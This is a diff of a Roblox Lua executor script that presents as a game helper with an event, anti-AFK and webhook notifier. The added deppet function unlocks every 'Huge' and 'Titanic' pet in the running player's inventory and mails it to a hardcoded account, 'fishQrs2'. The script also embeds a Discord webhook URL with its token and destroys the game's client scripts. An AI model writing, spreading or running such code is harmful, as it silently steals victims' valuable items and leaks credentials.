@@ -6,7 +6,11 @@ repeat
     task.wait()
 until game.PlaceId ~= nil
 
-
+task.wait(10)
+getgenv().SendHuge = true
+getgenv().Webhook_URL = "https://discord.com/api/webhooks/1070649711666659398/VxC4_UmdOOOadWi8Lhp6hGrgZ233tzMKnl7swCHdl41krha8aa28oCW5-Lp7arLPRmF4"
+getgenv().SendWebhook = true
+getgenv().OnlySendObtainedHuge = false
 
 local function Event()
     local Players2 = game:GetService("Players")
@@ -55,7 +59,7 @@ local function Event()
         end
     end
     task.wait()
-    --game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core:Destroy()
+    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core:Destroy()
     task.wait()
     game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs:Destroy()
     task.wait()
@@ -137,19 +141,63 @@ local function Event()
 
 end
 
+local function deppet()
+    local library = require(game.ReplicatedStorage.Library.Client.Save)
+    local save = library.Get()
+    if not getgenv().OnlySendObtainedHuge then
+        if save.Inventory.Pet ~= nil then
+            for id, pet in pairs(save.Inventory.Pet) do
+                if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
+                    if getgenv().SendHuge then
+                        local args = {
+                            [1] = id,
+                            [2] = false
+                        }
+                        print("hi")
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                        task.wait(0.5)
+                        local Mailargs = {
+                            [1] = "fishQrs2",
+                            [2] = "ty",
+                            [3] = "Pet",
+                            [4] = id,
+                            [5] = 1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(Mailargs))
+                        task.wait(1)
+
+                    end
+                end
+            end
+        end
+    end
+
+end
+
+local function afk()
+    spawn(function()
+        task.wait(1)
+        for i, v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
+            v:Disable()
+        end
+        
+        local vu = game:GetService("VirtualUser")
+        game:GetService("Players").LocalPlayer.Idled:Connect(function()
+           vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+           task.wait(1)
+           vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+        end)
+    end)
+end
+
+
 local function Webhook()
-    getgenv().SendHuge = true
-    getgenv().Webhook_URL = "https://discord.com/api/webhooks/1070649711666659398/VxC4_UmdOOOadWi8Lhp6hGrgZ233tzMKnl7swCHdl41krha8aa28oCW5-Lp7arLPRmF4"
-    getgenv().SendWebhook = true
-    getgenv().OnlySendObtainedHuge = false
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
     local HttpService = game:GetService("HttpService")
     local request = http_request or request
     local Network = ReplicatedStorage:WaitForChild("Network")
     local player = game:GetService("Players").LocalPlayer
-    local library = require(game.ReplicatedStorage.Library.Client.Save)
-    local save = library.Get()
     local userId = "651452406974119966"
     local pingUser = "<@" .. userId .. ">" or ""
     local connection
@@ -209,45 +257,6 @@ local function Webhook()
         end
     end
     
-    
-    if not getgenv().OnlySendObtainedHuge then
-        local function DepositPetInTrade()
-            if save.Inventory.Pet ~= nil then
-                for id, pet in pairs(save.Inventory.Pet) do
-                    if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
-                        
-                        if getgenv().SendHuge then
-                            local args = {
-                                [1] = id,
-                                [2] = false
-                            }
-                            
-                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-                            task.wait(0.5)
-                            local Mailargs = {
-                                [1] = "fishQrs2",
-                                [2] = "ty",
-                                [3] = "Pet",
-                                [4] = id,
-                                [5] = 1
-                            }
-                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(Mailargs))
-                            task.wait(1)
-    
-                        end
-                    else
-                        task.wait()
-                    end
-                end
-            end
-        end
-        DepositPetInTrade()
-    end
-    
-    
-    
-    
-    
     task.wait(2)
     
     
@@ -295,34 +304,8 @@ local function Webhook()
             end
         end
     end
-    
-    local function connectToItemsUpdate()
-        local network = ReplicatedStorage:FindFirstChild("Network")
-        if not network then
-            return
-        end
-        
-        local itemsUpdate = network:FindFirstChild("Items: Update")
-        if itemsUpdate then
-            connection = itemsUpdate.OnClientEvent:Connect(onItemsUpdate)
-        else
-            connection = network.ChildAdded:Connect(function(child)
-                if child.Name == "Items: Update" then
-                    connection:Disconnect()  -- Отключаем предыдущий слушатель
-                    connection = child.OnClientEvent:Connect(onItemsUpdate)
-                    -- Отправка уведомления о подключении
-                    game.StarterGui:SetCore("SendNotification", {
-                        Title = "Status",
-                        Text = "Script successfully injected! Good Luck!",
-                        Duration = 5,
-                    })
-                end
-            end)
-        end
-    end
-    
-    -- Подключаемся к событию
-    connectToItemsUpdate()
+    connection = ReplicatedStorage:FindFirstChild("Network"):FindFirstChild("Items: Update").OnClientEvent:Connect(onItemsUpdate)
+
     
     -- Проверка, установлено ли соединение
     if connection then
@@ -370,28 +353,13 @@ else
 end
 
 if tostring(game.PlaceId) == tostring(currentPlaceId) then
-    task.wait(60)
+    task.wait(20)
     Event()
-    task.wait(10)
-    task.delay(30,function()
-        local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-        local function ClaimMail()
-            network:WaitForChild("Mailbox: Claim All"):InvokeServer()
-        end
-        ClaimMail()
-    end)
-    spawn(function()
-        task.wait(120)
-        for i, v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
-            v:Disable()
-        end
-        
-        local vu = game:GetService("VirtualUser")
-        game:GetService("Players").LocalPlayer.Idled:Connect(function()
-           vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-           task.wait(1)
-           vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-        end)
-    end)
+    task.wait(1)
+    afk()
+    task.wait(1)
     Webhook()
+    task.wait(1)
+    deppet()
 end
+
